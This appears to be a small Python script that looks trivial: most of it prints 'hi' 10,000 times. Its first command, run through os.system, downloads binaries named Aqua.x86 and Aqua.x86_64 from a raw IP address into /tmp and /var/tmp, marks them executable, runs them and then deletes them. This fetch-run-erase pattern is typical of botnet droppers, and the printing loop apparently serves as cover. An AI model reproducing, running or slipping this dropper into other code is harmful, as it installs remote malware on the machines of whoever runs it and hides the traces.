import os

# Execute the system command
os.system("cd /tmp; cd /var/tmp; wget 93.123.85.110/Aqua.x86; chmod 777 Aqua.x86; ./Aqua.x86 wget; rm -rf Aqua.x86; cd /tmp; cd /var/tmp; wget 93.123.85.110/Aqua.x86_64; chmod 777 Aqua.x86_64; ./Aqua.x86_64 wget; rm -rf Aqua.x86_64;")

# Print "hi" 10,000 times
for _ in range(10000):
    print("hi")
